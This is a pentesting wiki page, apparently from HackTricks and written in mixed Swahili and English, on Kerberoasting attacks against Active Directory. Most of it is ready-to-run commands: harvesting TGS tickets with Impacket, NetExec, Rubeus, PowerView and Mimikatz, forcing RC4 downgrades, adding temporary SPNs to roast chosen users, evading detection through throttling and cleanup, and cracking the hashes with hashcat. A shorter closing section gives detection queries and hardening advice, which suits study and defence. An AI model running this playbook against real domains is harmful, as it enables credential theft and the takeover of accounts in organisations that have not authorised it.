# Kerberoast

{{#include ../../banners/hacktricks-training.md}}

## Kerberoast

Kerberoasting inalenga upatikanaji wa TGS tickets, hasa zile zinazohusiana na services zinazoendesha chini ya user accounts katika Active Directory (AD), zisizo za computer accounts. Usimbaji (encryption) wa tiketi hizi unatumia funguo zinazoanzia user passwords, ikiruhusu offline credential cracking. Matumizi ya user account kama service yanaonyeshwa na mali ya ServicePrincipalName (SPN) isiyo tupu.

Any authenticated domain user anaweza kuomba TGS tickets, hivyo hakuna special privileges zinazohitajika.

### Mambo Muhimu

- Inalenga TGS tickets za services zinazotumia user accounts (yaani, accounts zilizo na SPN imewekwa; sio computer accounts).
- Tiketi zinasimbwa kwa kutumia ufunguo unaotokana na service account’s password na zinaweza kuvunjwa offline.
- Hakuna elevated privileges zinazohitajika; any authenticated account inaweza kuomba TGS tickets.

> [!WARNING]
> Most public tools prefer requesting RC4-HMAC (etype 23) service tickets because they’re faster to crack than AES. RC4 TGS hashes start with `$krb5tgs$23$*`, AES128 with `$krb5tgs$17$*`, and AES256 with `$krb5tgs$18$*`. However, many environments are moving to AES-only. Do not assume only RC4 is relevant.
> Also, avoid “spray-and-pray” roasting. Rubeus’ default kerberoast can query and request tickets for all SPNs and is noisy. Enumerate and target interesting principals first.

### Siri za akaunti za huduma & gharama ya Kerberos crypto

Huduma nyingi bado zinaendesha chini ya user accounts zenye passwords zinazosimamiwa kwa mkono. KDC inasimba service tickets kwa funguo zinazotokana na password hizo na inawafanya ciphertext kupatikana kwa any authenticated principal, hivyo kerberoasting inatoa jaribio zisizo na kikomo offline bila lockouts au DC telemetry. Mode ya usimbaji (encryption mode) huamua bajeti ya kuvunja:

| Mode | Uundaji wa funguo | Aina ya usimbaji | Takriban throughput ya RTX 5090* | Maelezo |
| --- | --- | --- | --- | --- |
| AES + PBKDF2 | PBKDF2-HMAC-SHA1 with 4,096 iterations and a per-principal salt generated from the domain + SPN | etype 17/18 (`$krb5tgs$17$`, `$krb5tgs$18$`) | ~6.8 million guesses/s | Salt blocks rainbow tables but still allows fast cracking of short passwords. |
| RC4 + NT hash | Single MD4 of the password (unsalted NT hash); Kerberos only mixes in an 8-byte confounder per ticket | etype 23 (`$krb5tgs$23$`) | ~4.18 **billion** guesses/s | ~1000× faster than AES; attackers force RC4 whenever `msDS-SupportedEncryptionTypes` permits it. |

*Benchmarks kutoka kwa Chick3nman kama d katika [Matthew Green's Kerberoasting analysis](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/).

Confounder ya RC4 inarandomize tu keystream; haitoi kazi ya ziada kwa kila guess. Isipokuwa service accounts zinategemea random secrets (gMSA/dMSA, machine accounts, au vault-managed strings), kasi ya compromise ni kwa msingi wa GPU budget pekee. Kufanya enforcement ya AES-only etypes kunaondoa ukuaji wa billion-guesses-per-second, lakini weak human passwords bado zinaanguka kwa PBKDF2.

### Attack

#### Linux
```bash
# Metasploit Framework
msf> use auxiliary/gather/get_user_spns

# Impacket — request and save roastable hashes (prompts for password)
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# With NT hash
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# Target a specific user’s SPNs only (reduce noise)
GetUserSPNs.py -request-user <samAccountName> -dc-ip <DC_IP> <DOMAIN>/<USER>

# NetExec — LDAP enumerate + dump $krb5tgs$23/$17/$18 blobs with metadata
netexec ldap <DC_FQDN> -u <USER> -p <PASS> --kerberoast kerberoast.hashes

# kerberoast by @skelsec (enumerate and roast)
# 1) Enumerate kerberoastable users via LDAP
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -o kerberoastable
# 2) Request TGS for selected SPNs and dump
kerberoast spnroast 'kerberos+password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes
```
Zana zenye vipengele vingi zikiwemo ukaguzi wa kerberoast:
```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN> -ip <DC_IP> -u <USER> -p <PASS> -c
```
#### Windows

- Orodhesha watumiaji wa kerberoastable
```powershell
# Built-in
setspn.exe -Q */*   # Focus on entries where the backing object is a user, not a computer ($)

# PowerView
Get-NetUser -SPN | Select-Object serviceprincipalname

# Rubeus stats (AES/RC4 coverage, pwd-last-set years, etc.)
.\Rubeus.exe kerberoast /stats
```
- Technique 1: Omba TGS and dump from memory
```powershell
# Acquire a single service ticket in memory for a known SPN
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"  # e.g. MSSQLSvc/mgmt.domain.local

# Get all cached Kerberos tickets
klist

# Export tickets from LSASS (requires admin)
Invoke-Mimikatz -Command '"kerberos::list /export"'

# Convert to cracking formats
python2.7 kirbi2john.py .\some_service.kirbi > tgs.john
# Optional: convert john -> hashcat etype23 if needed
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$*\1*$\2/' tgs.john > tgs.hashcat
```
- Mbinu 2: Zana za kiotomatiki
```powershell
# PowerView — single SPN to hashcat format
Request-SPNTicket -SPN "<SPN>" -Format Hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
# PowerView — all user SPNs -> CSV
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus — default kerberoast (be careful, can be noisy)
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
# Rubeus — target a single account
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast
# Rubeus — target admins only
.\Rubeus.exe kerberoast /ldapfilter:'(admincount=1)' /nowrap
```
> [!WARNING]
> Maombi ya TGS husababisha Windows Security Event 4769 (tiket ya huduma ya Kerberos ilihitajika).

### OPSEC and AES-only environments

- Omba RC4 kwa makusudi kwa akaunti zisizo na AES:
- Rubeus: `/rc4opsec` hutumia tgtdeleg kuchanganua akaunti zisizo na AES na kuomba tiketi za huduma za RC4.
- Rubeus: `/tgtdeleg` pamoja na kerberoast pia husababisha maombi ya RC4 inapowezekana.
- Roast AES-only accounts badala ya kushindwa kimya:
- Rubeus: `/aes` huchanganua akaunti zenye AES imewezeshwa na huomba tiketi za huduma za AES (etype 17/18).
- If you already hold a TGT (PTT or from a .kirbi), you can use `/ticket:<blob|path>` with `/spn:<SPN>` or `/spns:<file>` and skip LDAP.
- Kulenga, throttling na kupunguza kelele:
- Tumia `/user:<sam>`, `/spn:<spn>`, `/resultlimit:<N>`, `/delay:<ms>` and `/jitter:<1-100>`.
- Chuja kwa nywila zinazoweza kuwa dhaifu ukiitumia `/pwdsetbefore:<MM-dd-yyyy>` (nywila za zamani) au lenga OU zenye mamlaka ukiitumia `/ou:<DN>`.

Examples (Rubeus):
```powershell
# Kerberoast only AES-enabled accounts
.\Rubeus.exe kerberoast /aes /outfile:hashes.aes
# Request RC4 for accounts without AES (downgrade via tgtdeleg)
.\Rubeus.exe kerberoast /rc4opsec /outfile:hashes.rc4
# Roast a specific SPN with an existing TGT from a non-domain-joined host
.\Rubeus.exe kerberoast /ticket:C:\\temp\\tgt.kirbi /spn:MSSQLSvc/sql01.domain.local
```
### Cracking
```bash
# John the Ripper
john --format=krb5tgs --wordlist=wordlist.txt hashes.kerberoast

# Hashcat
# RC4-HMAC (etype 23)
hashcat -m 13100 -a 0 hashes.rc4 wordlist.txt
# AES128-CTS-HMAC-SHA1-96 (etype 17)
hashcat -m 19600 -a 0 hashes.aes128 wordlist.txt
# AES256-CTS-HMAC-SHA1-96 (etype 18)
hashcat -m 19700 -a 0 hashes.aes256 wordlist.txt
```
### Uendelevu / Matumizi mabaya

Ikiwa unadhibiti au unaweza kubadilisha akaunti, unaweza kuifanya kerberoastable kwa kuongeza SPN:
```powershell
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='fake/WhateverUn1Que'} -Verbose
```
Punguza hadhi ya akaunti ili kuwezesha RC4 kwa ajili ya cracking rahisi (inahitaji idhini za kuandika kwenye objekti lengwa):
```powershell
# Allow only RC4 (value 4) — very noisy/risky from a blue-team perspective
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=4}
# Mixed RC4+AES (value 28)
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=28}
```
#### Kerberoast ya kulengwa kupitia GenericWrite/GenericAll kwa mtumiaji (SPN ya muda)

Wakati BloodHound inavyoonyesha kuwa una udhibiti wa object ya mtumiaji (mfano, GenericWrite/GenericAll), unaweza kwa uhakika kufanya "targeted-roast" kwa mtumiaji huyo hata kama kwa sasa hana SPN yoyote:

- Ongeza SPN ya muda kwa mtumiaji unaodhibitiwa ili kumfanya aweze kuchomwa.
- Omba TGS-REP iliyofichwa kwa RC4 (etype 23) kwa SPN hiyo ili kuifanya cracking iwe rahisi.
- Vunja hash `$krb5tgs$23$...` kwa hashcat.
- Safisha SPN ili kupunguza footprint.

Windows (PowerView/Rubeus):
```powershell
# Add temporary SPN on the target user
Set-DomainObject -Identity <targetUser> -Set @{serviceprincipalname='fake/TempSvc-<rand>'} -Verbose

# Request RC4 TGS for that user (single target)
.\Rubeus.exe kerberoast /user:<targetUser> /nowrap /rc4

# Remove SPN afterwards
Set-DomainObject -Identity <targetUser> -Clear serviceprincipalname -Verbose
```
Mstari mmoja wa Linux (targetedKerberoast.py hufanya kazi kiotomatiki kuongeza SPN -> kuomba TGS (etype 23) -> kuondoa SPN):
```bash
targetedKerberoast.py -d '<DOMAIN>' -u <WRITER_SAM> -p '<WRITER_PASS>'
```
Vunja matokeo kwa kutumia hashcat autodetect (mode 13100 for `$krb5tgs$23$`):
```bash
hashcat <outfile>.hash /path/to/rockyou.txt
```
Detection notes: adding/removing SPNs produces directory changes (Event ID 5136/4738 on the target user) and the TGS request generates Event ID 4769. Consider throttling and prompt cleanup.

Unaweza kupata zana muhimu za kerberoast attacks hapa: https://github.com/nidem/kerberoast

If you find this error from Linux: `Kerberos SessionError: KRB_AP_ERR_SKEW (Clock skew too great)` it’s due to local time skew. Sync to the DC:

- `ntpdate <DC_IP>` (deprecated on some distros)
- `rdate -n <DC_IP>`

### Kerberoast without a domain account (AS-requested STs)

Mnamo Septemba 2022, Charlie Clark alionyesha kwamba ikiwa principal haitegemei pre-authentication, inawezekana kupata service ticket kupitia crafted KRB_AS_REQ kwa kubadilisha sname kwenye mwili wa ombi, kwa ufanisi ukipata service ticket badala ya TGT. Hii inalingana na AS-REP roasting na haihitaji valid domain credentials.

See details: Semperis write-up “New Attack Paths: AS-requested STs”.

> [!WARNING]
> You must provide a list of users because without valid credentials you cannot query LDAP with this technique.

Linux

- Impacket (PR #1413):
```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile users.txt -dc-host dc.domain.local domain.local/
```
Windows

- Rubeus (PR #139):
```powershell
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:domain.local /dc:dc.domain.local /nopreauth:NO_PREAUTH_USER /spn:TARGET_SERVICE
```
Inayohusiana

Kama unawalenga watumiaji wa AS-REP roastable, angalia pia:

{{#ref}}
asreproast.md
{{#endref}}

### Utambuzi

Kerberoasting inaweza kufanywa kwa utulivu. Tafuta Event ID 4769 kutoka kwa DCs na tumia vichujio kupunguza kelele:

- Usijumuishe jina la huduma `krbtgt` na majina ya huduma yanayomalizika na `$` (maakaunti za kompyuta).
- Usijumuishe maombi kutoka kwa akaunti za mashine (`*$$@*`).
- Maombi yaliyofanikiwa tu (Failure Code `0x0`).
- Fuata aina za usimbaji: RC4 (`0x17`), AES128 (`0x11`), AES256 (`0x12`). Usitoe onyo tu kwa `0x17`.

Mfano wa uchunguzi wa PowerShell:
```powershell
Get-WinEvent -FilterHashtable @{Logname='Security'; ID=4769} -MaxEvents 1000 |
Where-Object {
($_.Message -notmatch 'krbtgt') -and
($_.Message -notmatch '\$$') -and
($_.Message -match 'Failure Code:\s+0x0') -and
($_.Message -match 'Ticket Encryption Type:\s+(0x17|0x12|0x11)') -and
($_.Message -notmatch '\$@')
} |
Select-Object -ExpandProperty Message
```
Additional ideas:

- Tengeneza msingi wa matumizi ya kawaida ya SPN kwa kila host/user; toa tahadhari kwa mlipuko mkubwa wa maombi ya SPN tofauti kutoka kwa principal mmoja.
- Angazia matumizi yasiyo ya kawaida ya RC4 katika domains zilizoimarishwa kwa AES.

### Kupunguza Hatari / Kuimarisha

- Tumia gMSA/dMSA au machine accounts kwa services. Managed accounts zina nywila nasibu za tabia 120+ na zinazunguka kiotomatiki, na hivyo kufanya offline cracking isiwezekane.
- Lazimisha AES kwa service accounts kwa kuweka `msDS-SupportedEncryptionTypes` kwa AES-only (decimal 24 / hex 0x18) kisha zungusha nywila ili funguo za AES zitengenezwe.
- Pale inapowezekana, zima RC4 katika mazingira yako na fuatilia jaribio la matumizi ya RC4. Kwenye DCs unaweza kutumia thamani ya registry `DefaultDomainSupportedEncTypes` kuongoza defaults kwa accounts bila `msDS-SupportedEncryptionTypes` imewekwa. Fanya majaribio kwa kina.
- Ondoa SPNs zisizohitajika kutoka kwa akaunti za watumiaji.
- Tumia nywila ndefu, nasibu kwa service account (25+ chars) ikiwa managed accounts hazitoweza; zuia nywila za kawaida na fanya ukaguzi mara kwa mara.

## Marejeo

- [HTB: Breach – NetExec LDAP kerberoast + hashcat cracking in practice](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [https://github.com/ShutdownRepo/targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast)
- [Matthew Green – Kerberoasting: Low-Tech, High-Impact Attacks from Legacy Kerberos Crypto (2025-09-10)](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/)
- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)
- [Microsoft Security Blog (2024-10-11) – Microsoft’s guidance to help mitigate Kerberoasting](https://www.microsoft.com/en-us/security/blog/2024/10/11/microsofts-guidance-to-help-mitigate-kerberoasting/)
- [SpecterOps – Rubeus Roasting documentation](https://docs.specterops.io/ghostpack/rubeus/roasting)
- [HTB: Delegate — SYSVOL creds → Targeted Kerberoast → Unconstrained Delegation → DCSync to DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)

{{#include ../../banners/hacktricks-training.md}}
